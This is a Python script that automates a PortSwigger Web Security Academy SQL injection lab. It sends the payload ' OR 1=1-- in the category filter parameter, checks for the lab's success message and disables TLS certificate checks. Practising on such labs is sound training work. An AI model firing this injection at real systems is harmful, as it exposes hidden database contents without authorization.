import requests
import sys
import urllib3
import argparse
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_vulnerability(url, proxies):
    try:
        r = requests.get(url + '/filter?category=Gifts', verify=False, proxies=proxies)
        print(f"[*] Baseline response size: {len(r.text)} bytes")
        return len(r.text)
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        sys.exit(-1)

def run_exploit(url, payload, proxies):
    uri = '/filter?category='
    full_url = url + uri + quote(payload)
    
    print(f"[*] Sending payload: {payload}")
    print(f"[*] Full URL: {full_url}")
    
    response = requests.get(full_url, verify=False, proxies=proxies)
    print(f"[*] Status: {response.status_code} | Size: {len(response.text)} bytes")
    
    if "Congratulations, you solved the lab!" in response.text:
        return True
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PortSwigger Lab 1: SQL Injection Automation")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--payload", default="' OR 1=1--", help="SQL injection payload")
    parser.add_argument("--proxy", default=None, help="Optional proxy (e.g. http://127.0.0.1:8080)")
    args = parser.parse_args()

    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else {}

    print("[*] Analyzing target...")
    check_vulnerability(args.url, proxies)

    if run_exploit(args.url, args.payload, proxies):
        print("[+] Success! Hidden content accessed.")
    else:
        print("[-] Failed. Payload didn't work or target is not vulnerable.")
